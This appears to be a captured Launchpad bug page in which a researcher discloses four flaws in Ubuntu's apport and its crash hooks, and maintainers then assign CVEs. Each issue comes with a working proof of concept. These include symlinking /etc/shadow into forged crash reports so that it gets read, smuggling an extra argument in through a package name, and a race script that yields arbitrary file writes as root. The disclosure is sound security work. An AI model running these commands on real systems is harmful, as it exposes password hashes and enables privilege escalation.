+During a cursory code review, several potential security issues in `apport` and crash-related hooks in packages such as `Xorg` and `openjdk-14-lts` have been identified.</p>
+<p>While the issue regarding the `openjdk-14-lts` package is exploitable<br />
+on default installations, the remaining issues most likely are mitigated by the sysctl setting `fs.protected_<wbr />symlinks` on default Ubuntu installations.</p>
+<p>With regard to issues mitigated by `fs.protected_<wbr />symlinks`<wbr />, it is not clear if they are considered to be part of the threat model, but nonetheless will be included in this report. Further, if the issues regarding package hooks should be reported in the corresponding packages&#x27; bug tracker, please let me know.</p>
+<p>## Issue 1: Arbitrary file read in package-<wbr />hooks/source_<wbr />openjdk-<wbr />*.py<br />
+The `add_info()` function allows for a directory traversal by building a file path using user-controlled data without properly sanitizing the resulting path.</p>
+<p>```Python<br />
+def add_info(report, ui=None):<br />
+&nbsp;&nbsp;&nbsp;&nbsp;if report[<wbr />&#x27;ProblemType&#x27;<wbr />] == &#x27;Crash&#x27; and &#x27;ProcCwd&#x27; in report:<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# attach hs_err_&lt;pid&gt;.pid file<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cwd = report[&#x27;ProcCwd&#x27;]<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pid_line = re.search(<wbr />&quot;Pid:\t(<wbr />.*)\n&quot;, report[<wbr />&quot;ProcStatus&quot;<wbr />])<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if pid_line:<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pid = pid_line.<wbr />groups(<wbr />)[0]<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;path = &quot;%s/hs_<wbr />err_pid%<wbr />s.log&quot; % (cwd, pid)<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# make sure if exists<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if os.path.<wbr />exists(<wbr />path):<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;content = read_file(path)<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# truncate if bigger than 100 KB<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# see LP: <a href="/bugs/1696814" class="bug-link">#1696814</a><br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;max_length = 100*1024<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if sys.getsizeof(<wbr />content) &lt; max_length:<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;report[<wbr />&#x27;HotspotError&#x27;<wbr />] = content<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;report[<wbr />&#x27;Tags&#x27;] += &#x27; openjdk-hs-err&#x27;<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;else:<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;report[<wbr />&#x27;HotspotError&#x27;<wbr />] = content[<wbr />:max_length] + \<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&quot;\n[truncated by openjdk-11 apport hook]&quot; + \<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&quot;\n[max log size is %s, file size was %s]&quot; % \<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />(si_units(<wbr />max_length)<wbr />, si_units(<wbr />sys.getsizeof(<wbr />content)<wbr />))<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;report[<wbr />&#x27;Tags&#x27;] += &#x27; openjdk-hs-err&#x27;<br />
+```</p>
+<p>By injecting a `ProcCwd` such as `/home/user/` and a `Pid` such as `0`, the function includes an arbitrary file by following a potential symbolic link `/home/<wbr />user/hs_<wbr />err_pid0.<wbr />log`.</p>
+<p>### PoC<br />
+```<br />
+$ sudo apt install openjdk-14-jdk</p>
+<p>$ sudo sysctl fs.protected_<wbr />symlinks<br />
+fs.protected_<wbr />symlinks = 1</p>
+<p>$ ln -s /etc/shadow /home/user/<wbr />hs_err_<wbr />pid0.log</p>
+<p>$ pid=$&#x27;\t0&#x27;;cat &lt;&lt; EOF &gt; /var/crash/<wbr />poc.crash<br />
+ProblemType: Crash<br />
+ExecutablePath: /poc<br />
+Package: openjdk-lts 123<br />
+SourcePackage: openjdk-lts<br />
+ProcCwd: /home/user<br />
+ProcStatus:<br />
+&nbsp;Pid:$pid<br />
+&nbsp;Uid:$pid<br />
+EOF</p>
+<p>$ grep -A3 root: /var/crash/<wbr />poc.crash<br />
+&nbsp;root:!<wbr />:18393:<wbr />0:99999:<wbr />7:::<br />
+&nbsp;daemon:<wbr />*:18375:<wbr />0:99999:<wbr />7:::<br />
+&nbsp;bin:*:<wbr />18375:0:<wbr />99999:7:<wbr />::<br />
+&nbsp;sys:*:<wbr />18375:0:<wbr />99999:7:<wbr />::<br />
+```</p>
+<p>## Issue 2: Arbitrary file read in package-<wbr />hooks/source_<wbr />xorg.py (Info)<br />
+The root cause of this issue stems from the fact, that a potentially<br />
+user-controlled file in the `/tmp` directory is not checked for being a symbolic link and therefore might allow including arbitrary files in the processed crash report:</p>
+<p>Note: Requires `fs.protected_<wbr />symlinks=<wbr />0`</p>
+<p>```Python<br />
+def attach_<wbr />3d_info(<wbr />report, ui=None):<br />
+&nbsp;&nbsp;&nbsp;&nbsp;...</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;# Compiz internal state if compiz crashed<br />
+&nbsp;&nbsp;&nbsp;&nbsp;if True or report.<wbr />get(&#x27;SourcePack<wbr />age&#x27;,&#x27;Unknown&#x27;<wbr />) == &quot;compiz&quot; and &quot;ProcStatus&quot; in report:<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;compiz_pid = 0<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;pid_line = re.search(<wbr />&quot;Pid:\t(<wbr />.*)\n&quot;, report[<wbr />&quot;ProcStatus&quot;<wbr />])<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if pid_line:<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;compiz_<wbr />pid = pid_line.<wbr />groups(<wbr />)[0]<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;compiz_<wbr />state_file = &#x27;/tmp/compiz_<wbr />internal_<wbr />state%s&#x27; % compiz_pid<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;attach_<wbr />file_if_<wbr />exists(<wbr />report, compiz_state_file, &quot;compiz_<wbr />internal_<wbr />states&quot;<wbr />)<br />
+```</p>
+<p>### PoC<br />
+```<br />
+$ sudo sysctl fs.protected_<wbr />symlinks=<wbr />0<br />
+fs.protected_<wbr />symlinks = 0</p>
+<p>$ ln -s /etc/shadow /tmp/compiz_<wbr />internal_<wbr />state0</p>
+<p>$ cat &lt;&lt; EOF &gt; /var/crash/<wbr />poc.crash<br />
+ProblemType: Crash<br />
+ExecutablePath: /poc<br />
+Package: source_xorg 123<br />
+SourcePackage: compiz<br />
+ProcStatus:<br />
+&nbsp;Pid:<br />
+EOF</p>
+<p>$ grep -A3 compiz_internal poc.crash<br />
+compiz_<wbr />internal_<wbr />states:<br />
+&nbsp;root:!<wbr />:18686:<wbr />0:99999:<wbr />7:::<br />
+&nbsp;daemon:<wbr />*:18474:<wbr />0:99999:<wbr />7:::<br />
+&nbsp;bin:*:<wbr />18474:0:<wbr />99999:7:<wbr />::<br />
+```</p>
+<p>## Issue 3: Spoof modified config files via argument injection (Info)<br />
+The `get_modified_<wbr />conffiles(<wbr />)` function allows to spoof modified configuration files by a controlled package name:</p>
+<p>```Python<br />
+def get_modified_<wbr />conffiles(<wbr />self, package):<br />
+...<br />
+&nbsp;&nbsp;&nbsp;&nbsp;dpkg = subprocess.<wbr />Popen([<wbr />&#x27;dpkg-query&#x27;<wbr />, &#x27;-W&#x27;, &#x27;--showformat=<wbr />${Conffiles}<wbr />&#x27;,<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;package]<wbr />, stdout=<wbr />subprocess.<wbr />PIPE)<br />
+```</p>
+<p>By supplying a `package` name such as<br />
+`--showformat=<wbr />&#x27;${Conffiles;<wbr />6}shadow 1\n&#x27;` it is possible to manipulate dpkg-query&#x27;s output and therefore to include the `shadow` file in the resulting crash report.</p>
+<p>Please note however that this function is seemingly only called in the `attach_<wbr />conffiles(<wbr />)` function, which subsequently requires a UI response<br />
+of the user to finally include the file in the crash report.</p>
+<p>### PoC<br />
+```<br />
+$ dpkg-query -W --showformat=<wbr />&#x27;${Conffiles}<wbr />&#x27; --showformat=<wbr />&#x27;${Conffiles;<wbr />6}shadow 1\n&#x27; | head -n2<br />
+&nbsp;/etc/shadow 1<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shadow 1<br />
+```</p>
+<p>## Issue 4: Arbitrary file write in whoopsie-upload-all (Info)<br />
+After adding additional information to the crash file, `whoopsie-<wbr />upload-<wbr />all` does not check if the crash file was replaced by a symbolic link before writing the extended report back into the file. Thus, replacing the crash file with a symbolic link allows to write into arbitrary files using `whoopsie-<wbr />upload-<wbr />all`&#x27;s elevated privileges. By using a program&#x27;s lax configuration parsing (e.g. `logrotate`), this might lead to code execution.</p>
+<p>Note: Requires `fs.protected_<wbr />symlinks=<wbr />0`</p>
+<p>```Python<br />
+def process_<wbr />report(<wbr />report)<wbr />:<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&#x27;&#x27;&#x27;Collect information for a report and mark for whoopsie upload<br />
+&nbsp;&nbsp;&nbsp;&nbsp;...<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# write updated report, we use os.open and os.fdopen as<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;# /proc/sys/<wbr />fs/protected_<wbr />regular is set to 1 (LP: <a href="/bugs/1848064" class="bug-link">#1848064</a>)<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;fd = os.open(report, os.O_WRONLY | os.O_APPEND)<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;with os.fdopen(fd, &#x27;wb&#x27;) as f:<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;os.<wbr />chmod(report, 0)<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r.<wbr />write(f, only_new=True)<br />
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;os.<wbr />chmod(report, 0o640)<br />
+```</p>
+<p>### PoC<br />
+```<br />
+$ sudo sysctl fs.protected_<wbr />symlinks<br />
+fs.protected_<wbr />symlinks = 0</p>
+<p>$ cat ex.sh<br />
+TARGET=&quot;/JRN&quot;<br />
+while :; do<br />
+&nbsp;&nbsp;FN=&quot;/<wbr />var/crash/<wbr />$RANDOM.<wbr />poc.crash&quot;<br />
+&nbsp;&nbsp;pid=$&#x27;\t0&#x27;;cat &lt;&lt; EOF &gt; $FN<br />
+ProblemType: Crash<br />
+ExecutablePath: /poc<br />
+Package: openjdk-lts 123<br />
+SourcePackage: openjdk-lts<br />
+ProcCwd: /home/user<br />
+ProcStatus:<br />
+&nbsp;Pid:$pid<br />
+&nbsp;Uid:$pid<br />
+EOF<br />
+&nbsp;&nbsp;while :; do<br />
+&nbsp;&nbsp;&nbsp;&nbsp;if ps aux|grep -q &quot;[w]hoopsie-<wbr />upload-<wbr />all&quot;;then break; fi<br />
+&nbsp;&nbsp;done<br />
+&nbsp;&nbsp;sleep 0.3<br />
+&nbsp;&nbsp;rm -f $FN<br />
+&nbsp;&nbsp;ln -s $TARGET $FN</p>
+<p>&nbsp;&nbsp;if [ -s /JRN ]; then echo DONE.; break; fi<br />
+done</p>
+<p>$ sudo touch /JRN; ls -l /JRN  # simulating file in e.g. /etc/logrotate.d/<br />
+-rw-r--r-- 1 root root 0 M�r  3 14:15 /JRN</p>
+<p>$ bash ex.sh<br />
+DONE.</p>
+<p>$ ls -l /JRN; sudo head -n3 /JRN<br />
+-rw-r----- 1 root root 105028 M�r  3 14:16 /JRN<br />
+ApportVersion: 2.20.11-<wbr />0ubuntu27.<wbr />16<br />
+Architecture: amd64<br />
+CasperMD5CheckR<wbr />esult: skip<br />
+```</p>
+<p># Credits<br />
+Please credit &lt;email address hidden&gt; (@fktio) if the issues are considered valid. Further, please coordinate the patch release date with us, in case we consider publishing a short article about these issues.</p>
+<p>Best regards,<br />
+maik</p></div>
+  </div>
+
+  
+</div>
+
+
+        <div style="margin:-10px 0 20px 5px" class="clearfix">
+          <span>See <a href="comments/0">original description</a></span>
+        </div>
+
+        <div id="bug-tags">
+          <span id="tags-heading">
+            
+          </span>
+          <span id="tag-list">
+          </span>
+          <a href="+edit" title="Add tags" id="tags-trigger" class="sprite add">Add tags</a>
+          
+          <a href="/+help-bugs/tag-help.html" target="help" class="sprite maybe action-icon">Tag help</a>
+        </div>
+
+        <script type="text/javascript">
+          LPJS.use('event', 'node', 'lp.bugs.tags_entry', function(Y) {
+              Y.on('domready',
+                   function(e) {
+                       Y.lp.bugs.tags_entry.setup_tag_entry(
+                           available_official_tags);
+                   },
+                   window);
+          });
+        </script>
+
+        <div class="clearfix"></div>
+      </div>
+
+      <div id="branches-and-cves">
+        <div id="bug-branches-container" style="float: left">
+          
+        </div><!-- bug-branch-container -->
+
+        <div class="cves">
+          <h2>CVE References</h2>
+          <ul>
+            <li class="sprite cve">
+              <a href="/bugs/cve/2021-32547" title="It was discovered that read_file() in...">2021-32547</a>
+            </li>
+            <li class="sprite cve">
+              <a href="/bugs/cve/2021-32548" title="It was discovered that read_file() in...">2021-32548</a>
+            </li>
+            <li class="sprite cve">
+              <a href="/bugs/cve/2021-32549" title="It was discovered that read_file() in...">2021-32549</a>
+            </li>
+            <li class="sprite cve">
+              <a href="/bugs/cve/2021-32550" title="It was discovered that read_file() in...">2021-32550</a>
+            </li>
+            <li class="sprite cve">
+              <a href="/bugs/cve/2021-32551" title="It was discovered that read_file() in...">2021-32551</a>
+            </li>
+            <li class="sprite cve">
+              <a href="/bugs/cve/2021-32552" title="It was discovered that read_file() in...">2021-32552</a>
+            </li>
+            <li class="sprite cve">
+              <a href="/bugs/cve/2021-32553" title="It was discovered that read_file() in...">2021-32553</a>
+            </li>
+            <li class="sprite cve">
+              <a href="/bugs/cve/2021-32554" title="It was discovered that read_file() in...">2021-32554</a>
+            </li>
+            <li class="sprite cve">
+              <a href="/bugs/cve/2021-32555" title="It was discovered that read_file() in...">2021-32555</a>
+            </li>
+            <li class="sprite cve">
+              <a href="/bugs/cve/2021-32556" title="It was discovered that the get_modifi...">2021-32556</a>
+            </li>
+            <li class="sprite cve">
+              <a href="/bugs/cve/2021-32557" title="It was discovered that the process_re...">2021-32557</a>
+            </li>
+          </ul>
+        </div>
+
+        <div class="clearfix"></div>
+      </div> <!-- branches and CVEs -->
+
+      </div>
+
+      <div>
+      
+        
+          
+
+          
+              <div class="boardComment">
+  <div class="boardCommentDetails">
+    
+      <a href="https://launchpad.net/~mallle" class="sprite person">mal (mallle)</a>
+    
+    <time title="2021-03-05 16:07:29 UTC" datetime="2021-03-05T16:07:29.736826+00:00">on 2021-03-05</time>
+  </div>
+  <div class="boardCommentActivity">
+    <table class="bug-activity">
+  
+    
+      
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>description</b>:
+      </td>
+      <td>
+        updated
+      </td>
+    </tr>
+    <tr>
+      <td style="text-align: right;">
+        <b>description</b>:
+      </td>
+      <td>
+        updated
+      </td>
+    </tr>
+  
+</table>
+  </div>
+</div>
+          
+
+          
+
+        
+        
+          
+
+          
+              <div class="boardComment">
+  <div class="boardCommentDetails">
+    
+      <a href="https://launchpad.net/~mallle" class="sprite person">mal (mallle)</a>
+    
+    <time title="2021-03-05 16:41:43 UTC" datetime="2021-03-05T16:41:43.909351+00:00">on 2021-03-05</time>
+  </div>
+  <div class="boardCommentActivity">
+    <table class="bug-activity">
+  
+    
+      
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>description</b>:
+      </td>
+      <td>
+        updated
+      </td>
+    </tr>
+  
+</table>
+  </div>
+</div>
+          
+
+          
+
+        
+        
+          
+            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
+                  " data-baseurl="/ubuntu/+source/apport/+bug/1917904/comments/1" data-i-can-edit="False">
+  <div class="boardCommentDetails">
+    <div class="message-revision-container">
+      <div class="message-revision-container-header">
+        <span>Revision history for this message</span>
+        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
+      </div>
+      <script type="text/template">
+        <div class='message-revision-item'>
+          <div class='message-revision-title'>
+              <a class="sprite remove action-icon message-revision-del-btn">
+                  Remove
+              </a>
+              <a class="js-action">
+                  Revision #{revision}, created at {date_created_display}
+              </a>
+          </div>
+          <div class='message-revision-body'>{content}</div>
+        </div>
+      </script>
+      <div class="message-revision-list"></div>
+    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>
+            <a href="https://launchpad.net/~mallle" class="sprite person">mal (mallle)</a>
+            wrote
+            <time itemprop="commentTime" datetime="2021-05-08T19:45:29.541589+00:00" title="2021-05-08 19:45:29 UTC">on 2021-05-08</time><span class="editable-message-last-edit-date">:
+              </span>
+              
+          </td>
+          
+
+          <td>
+            
+          </td>
+          <td>
+            
+          </td>
+          <td class="bug-comment-index">
+          <a itemprop="url" href="/ubuntu/+source/apport/+bug/1917904/comments/1"> #1</a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="boardCommentBody">
+    
+
+    
+
+    
+
+  
+  <div class="editable-message-body">
+    <div class="comment-text editable-message-text" itemprop="commentText"><p>With the report being open for 2 months without a response I kindly wanted to ask if the issues will be addressed or are considered out-of-scope?</p>
+<p>Best regards,<br />
+maik</p></div>
+    
+    
+    
+  </div>
+
+  <div class="editable-message-form" style="display: none">
+     <textarea style="width: 100%" rows="10">With the report being open for 2 months without a response I kindly wanted to ask if the issues will be addressed or are considered out-of-scope?
+
+Best regards,
+maik</textarea>
+     <input type="button" value="Update" class="editable-message-update-btn" />
+     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
+  </div>
+
+
+  </div>
+
+  
+  
+</div>
+
+          
+
+          
+
+          
+
+        
+        
+          
+            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
+                  " data-baseurl="/ubuntu/+source/apport/+bug/1917904/comments/2" data-i-can-edit="False">
+  <div class="boardCommentDetails">
+    <div class="message-revision-container">
+      <div class="message-revision-container-header">
+        <span>Revision history for this message</span>
+        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
+      </div>
+      <script type="text/template">
+        <div class='message-revision-item'>
+          <div class='message-revision-title'>
+              <a class="sprite remove action-icon message-revision-del-btn">
+                  Remove
+              </a>
+              <a class="js-action">
+                  Revision #{revision}, created at {date_created_display}
+              </a>
+          </div>
+          <div class='message-revision-body'>{content}</div>
+        </div>
+      </script>
+      <div class="message-revision-list"></div>
+    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>
+            <a href="https://launchpad.net/~mdeslaur" class="sprite person">Marc Deslauriers (mdeslaur)</a>
+            wrote
+            <time itemprop="commentTime" datetime="2021-05-08T20:02:27.246825+00:00" title="2021-05-08 20:02:27 UTC">on 2021-05-08</time><span class="editable-message-last-edit-date">:
+              </span>
+              
+          </td>
+          
+
+          <td>
+            
+          </td>
+          <td>
+            
+          </td>
+          <td class="bug-comment-index">
+          <a itemprop="url" href="/ubuntu/+source/apport/+bug/1917904/comments/2"> #2</a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="boardCommentBody">
+    
+
+    
+
+    
+
+  
+  <div class="editable-message-body">
+    <div class="comment-text editable-message-text" itemprop="commentText"><p>The bug was overlooked as it was filed against the upstream Apport project which isn&#x27;t monitored. I&#x27;ve reassigned it to the apport package in Ubuntu now, and I&#x27;ll take a look this week.</p></div>
+    
+    
+    
+  </div>
+
+  <div class="editable-message-form" style="display: none">
+     <textarea style="width: 100%" rows="10">The bug was overlooked as it was filed against the upstream Apport project which isn't monitored. I've reassigned it to the apport package in Ubuntu now, and I'll take a look this week.</textarea>
+     <input type="button" value="Update" class="editable-message-update-btn" />
+     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
+  </div>
+
+
+  </div>
+
+  <div class="boardCommentActivity">
+    
+      <table class="bug-activity">
+  
+    
+      
+    
+    <tr>
+      <td style="text-align: right;">
+        <b>affects</b>:
+      </td>
+      <td>
+        apport &#8594; apport (Ubuntu)
+      </td>
+    </tr>
+  
+</table>
+    
+    
+  </div>
+  
+</div>
+
+          
+
+          
+
+          
+
+        
+        
+          
+            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
+                  " data-baseurl="/ubuntu/+source/apport/+bug/1917904/comments/3" data-i-can-edit="False">
+  <div class="boardCommentDetails">
+    <div class="message-revision-container">
+      <div class="message-revision-container-header">
+        <span>Revision history for this message</span>
+        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
+      </div>
+      <script type="text/template">
+        <div class='message-revision-item'>
+          <div class='message-revision-title'>
+              <a class="sprite remove action-icon message-revision-del-btn">
+                  Remove
+              </a>
+              <a class="js-action">
+                  Revision #{revision}, created at {date_created_display}
+              </a>
+          </div>
+          <div class='message-revision-body'>{content}</div>
+        </div>
+      </script>
+      <div class="message-revision-list"></div>
+    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>
+            <a href="https://launchpad.net/~mdeslaur" class="sprite person">Marc Deslauriers (mdeslaur)</a>
+            wrote
+            <time itemprop="commentTime" datetime="2021-05-10T17:49:24.586027+00:00" title="2021-05-10 17:49:24 UTC">on 2021-05-10</time><span class="editable-message-last-edit-date">:
+              </span>
+              
+          </td>
+          
+
+          <td>
+            
+          </td>
+          <td>
+            
+          </td>
+          <td class="bug-comment-index">
+          <a itemprop="url" href="/ubuntu/+source/apport/+bug/1917904/comments/3"> #3</a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="boardCommentBody">
+    
+
+    
+
+    
+
+  
+  <div class="editable-message-body">
+    <div class="comment-text editable-message-text" itemprop="commentText"><p>issue #1 affects openjdk-lts, openjdk-8, openjdk-13, openjdk-14, openjdk-15, openjdk-16, openjdk-17<br />
+issue #2 affects xorg, xorg-hwe-18.04<br />
+issues #3 and #4 affect apport</p></div>
+    
+    
+    
+  </div>
+
+  <div class="editable-message-form" style="display: none">
+     <textarea style="width: 100%" rows="10">issue #1 affects openjdk-lts, openjdk-8, openjdk-13, openjdk-14, openjdk-15, openjdk-16, openjdk-17
+issue #2 affects xorg, xorg-hwe-18.04
+issues #3 and #4 affect apport
+</textarea>
+     <input type="button" value="Update" class="editable-message-update-btn" />
+     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
+  </div>
+
+
+  </div>
+
+  
+  
+</div>
+
+          
+
+          
+
+          
+
+        
+        
+          
+            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
+                  " data-baseurl="/ubuntu/+source/apport/+bug/1917904/comments/4" data-i-can-edit="False">
+  <div class="boardCommentDetails">
+    <div class="message-revision-container">
+      <div class="message-revision-container-header">
+        <span>Revision history for this message</span>
+        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
+      </div>
+      <script type="text/template">
+        <div class='message-revision-item'>
+          <div class='message-revision-title'>
+              <a class="sprite remove action-icon message-revision-del-btn">
+                  Remove
+              </a>
+              <a class="js-action">
+                  Revision #{revision}, created at {date_created_display}
+              </a>
+          </div>
+          <div class='message-revision-body'>{content}</div>
+        </div>
+      </script>
+      <div class="message-revision-list"></div>
+    </div>
+
+    <table>
+      <tbody>
+        <tr>
+          <td>
+            <a href="https://launchpad.net/~seth-arnold" class="sprite person">Seth Arnold (seth-arnold)</a>
+            wrote
+            <time itemprop="commentTime" datetime="2021-05-10T22:44:12.074715+00:00" title="2021-05-10 22:44:12 UTC">on 2021-05-10</time><span class="editable-message-last-edit-date">:
+              </span>
+              
+          </td>
+          
+
+          <td>
+            
+          </td>
+          <td>
+            
+          </td>
+          <td class="bug-comment-index">
+          <a itemprop="url" href="/ubuntu/+source/apport/+bug/1917904/comments/4"> #4</a>
+          </td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div class="boardCommentBody">
+    
+
+    
+
+    
+
+  
+  <div class="editable-message-body">
+    <div class="comment-text editable-message-text" itemprop="commentText"><p>Nice report Mal, thanks.</p>
+<p>CVE-2021-32547 (openjdk-lts) -- add_info() arbitary file read<br />
+CVE-2021-32548 (openjdk-8) -- add_info() arbitary file read<br />
+CVE-2021-32549 (openjdk-13) -- add_info() arbitary file read<br />
+CVE-2021-32550 (openjdk-14) -- add_info() arbitary file read<br />
+CVE-2021-32551 (openjdk-15) -- add_info() arbitary file read<br />
+CVE-2021-32552 (openjdk-16) -- add_info() arbitary file read<br />
+CVE-2021-32553 (openjdk-17) -- add_info() arbitary file read<br />
+CVE-2021-32554 (xorg) -- attach_3d_info() arbitrary file read<br />
+CVE-2021-32555 (xorg-hwe-18.04) -- attach_3d_info() arbitrary file read<br />
+CVE-2021-32556 (apport) -- get_modified_<wbr />conffiles(<wbr />) incorrect changed files<br />
+CVE-2021-32557 (apport) -- process_report() arbitrary file write</p>
